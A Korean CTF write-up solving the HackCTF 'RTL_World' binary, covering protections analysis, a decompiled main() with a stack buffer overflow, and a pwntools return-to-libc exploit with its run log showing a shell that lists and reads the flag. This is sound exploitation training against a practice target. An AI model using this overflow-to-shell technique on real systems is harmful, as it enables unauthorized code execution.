**HackCTF - RTL_World**

| layout | title                         | auther   | categories | tags           |
| ------ | ----------------------------- | -------- | ---------- | -------------- |
| post   | HackCTF - RTL_World | Y3oj4eng | writeup    | writeupwargame |

# Analysis

`file` 명령어를 통해 해당 바이너리의 정보를 습득한다.
```bash
mac at ubuntu in ~/Desktop/hackCTF
$ file rtl_world 
rtl_world: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=8c8517ab9344393e62869f9fa9aad2de42e5a6b1, not stripped
```
이번 문제도 `ELF 32-bit` 구조다.


`checksec` 명령을 통해 해당 바이너리에 적용된 보호기법을 확인한다.

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ checksec rtl_world 
[*] '/home/mac/Desktop/hackCTF/rtl_world'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

`NX`만 채택되었다.

따라서 스택과 힙, 데이터 영역에 실행 권한을 갖지 못한다.

프로그램을 한번 실행시켜보고 본격적으로 분석을 진행한다.

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ ./rtl_world 


NPC [Village Presient] : 
Binary Boss made our village fall into disuse...
If you Have System Armor && Shell Sword.
You can kill the Binary Boss...
Help me Pwnable Hero... :(

Your Gold : 1000
======= Welcome to RTL World =======
1) Information the Binary Boss!
2) Make Money
3) Get the System Armor
4) Get the Shell Sword
5) Kill the Binary Boss!!!
6) Exit
====================================
>>> 
```

오호 이번문제는 단순히 입력 -> 출력의 프로세스가 아닌 프로그램과 사용자간의 `interactive`한 바이너리다.

`IDA`를 통해 내부 코드를 살펴본다.
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int v4; // [esp+10h] [ebp-90h]
  char buf; // [esp+14h] [ebp-8Ch]
  void *v6; // [esp+94h] [ebp-Ch]
  void *handle; // [esp+98h] [ebp-8h]
  void *s1; // [esp+9Ch] [ebp-4h]

  setvbuf(stdout, 0, 2, 0);
  handle = dlopen("/lib/i386-linux-gnu/libc.so.6", 1);
  v6 = dlsym(handle, "system");
  dlclose(handle);
  for ( s1 = v6; memcmp(s1, "/bin/sh", 8u); s1 = (char *)s1 + 1 )
    ;
  puts("\n\nNPC [Village Presient] : ");
  puts("Binary Boss made our village fall into disuse...");
  puts("If you Have System Armor && Shell Sword.");
  puts("You can kill the Binary Boss...");
  puts("Help me Pwnable Hero... :(\n");
  printf("Your Gold : %d\n", gold);
  while ( 1 )
  {
    Menu();
    printf(">>> ");
    __isoc99_scanf("%d", &v4);
    switch ( v4 )
    {
      case 1:
        system("clear");
        puts("[Binary Boss]\n");
        puts("Arch:     i386-32-little");
        puts("RELRO:    Partial RELRO");
        puts("Stack:    No canary found");
        puts("NX:       NX enabled");
        puts("PIE:      No PIE (0x8048000)");
        puts("ASLR:  Enable");
        printf("Binary Boss live in %p\n", handle);
        puts("Binart Boss HP is 140 + Armor + 4\n");
        break;
      case 2:
        Get_Money(gold);
        break;
      case 3:
        if ( gold <= 1999 )
        {
          puts("You don't have gold... :(");
        }
        else
        {
          gold -= 1999;
          printf("System Armor : %p\n", v6);
        }
        break;
      case 4:
        if ( gold <= 2999 )
        {
          puts("You don't have gold... :(");
        }
        else
        {
          gold -= 2999;
          printf("Shell Sword : %p\n", s1);
        }
        break;
      case 5:
        printf("[Attack] > ");
        read(0, &buf, 0x400u);
        return 0;
      case 6:
        puts("Your Not Hero... Bye...");
        exit(0);
        return result;
      default:
        continue;
    }
  }
}
```
메인 함수이다.
코드는 다소 복잡해보이지만 취약점은 매우 단순하다.

`buf` 변수는 `ebp-0x8c`에 위치하며 해당 변수에 값을 입력받는 부분은 `case 5:`부분이다.
5번 케이스 분기문을 보면 `read(0. &buf, 0x400u)` 를 확인할 수 있다.

즉, 버퍼는 `140 bytes`인데 `1400 bytes`를 입력받는다. 따라서 `BOF` 취약점이 존재한다.

하지만, 해당 바이너리에는 `NX`가 적용되어 쉘코드를 메모리상에 적재하여도 실행권한을 갖지 못한다.

방법을 찾던 도중 라이브러리 함수 중 `system`함수가 쓰였고 `system` 함수의 주소는
```bash
mac at ubuntu in ~/Desktop/hackCTF
$ gdb -q rtl_world 
Reading symbols from rtl_world...(no debugging symbols found)...done.
gdb-peda$ pd system
Dump of assembler code for function system@plt:
   0x080485b0 <+0>:	jmp    DWORD PTR ds:0x804b020
   0x080485b6 <+6>:	push   0x28
   0x080485bb <+11>:	jmp    0x8048550
End of assembler dump.
gdb-peda$ 
```
`gdb`를 통해 알아냈다.
`system_addr = 0x80485b0`

또한 `system` 함수의 인자로 넣어줄 `/bin/sh`문자열도 `IDA` 를 통해 확인했다.

![image](https://user-images.githubusercontent.com/33051018/76086364-4e185600-5ff7-11ea-9747-1ea860fac789.png)

`binsh_addr = 0x8048EB1

따라서, `Case 5`로 분기시킨 뒤, 입력을 받는 부분에서 `RTL` 기법을 활용하여 문제를 풀어낸다.

페이로드의 구성은 간단하다.

`payload : buffer(14bytes) + SFP(4bytes) + &system + dummy(4bytes) + &"/bin/sh"`

# Exploit
```python
from pwn import *

context.log_level = 'debug'

p = remote('ctf.j0n9hyun.xyz', 3010)
# p = process('./rtl_world')

# materials for exploit
system_addr = 0x80485b0
binsh = 0x8048eb1

# payload setup
payload = ''
payload += 'A'*144
payload += p32(system_addr)
payload += 'AAAA'    
payload += p32(binsh)

# access to "case 5:"
p.recvuntil('>>> ')
p.sendline('5')
log.info('send 5')

# send the payload
p.recvuntil('> ')
p.sendline(payload)
log.info('send payload')

p.interactive()
```


# result
```bash
mac at ubuntu in ~/Desktop/hackCTF
$ python ex.py 
[+] Opening connection to ctf.j0n9hyun.xyz on port 3010: Done
[DEBUG] Received 0x1b bytes:
    '\n'
    '\n'
    'NPC [Village Presient] : '
[DEBUG] Received 0x176 bytes:
    '\n'
    'Binary Boss made our village fall into disuse...\n'
    'If you Have System Armor && Shell Sword.\n'
    'You can kill the Binary Boss...\n'
    'Help me Pwnable Hero... :(\n'
    '\n'
    'Your Gold : 1000\n'
    '======= Welcome to RTL World =======\n'
    '1) Information the Binary Boss!\n'
    '2) Make Money\n'
    '3) Get the System Armor\n'
    '4) Get the Shell Sword\n'
    '5) Kill the Binary Boss!!!\n'
    '6) Exit\n'
    '====================================\n'
    '>>> '
[DEBUG] Sent 0x2 bytes:
    '5\n'
[*] send 5
[DEBUG] Received 0xb bytes:
    '[Attack] > '
[DEBUG] Sent 0x9d bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000090  b0 85 04 08  41 41 41 41  b1 8e 04 08  0a           │····│AAAA│····│·│
    0000009d
[*] send payload
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0xa bytes:
    'flag\n'
    'main\n'
flag
main
$ cat flag
[DEBUG] Sent 0x9 bytes:
    'cat flag\n'
```
~~flag는 비공개~~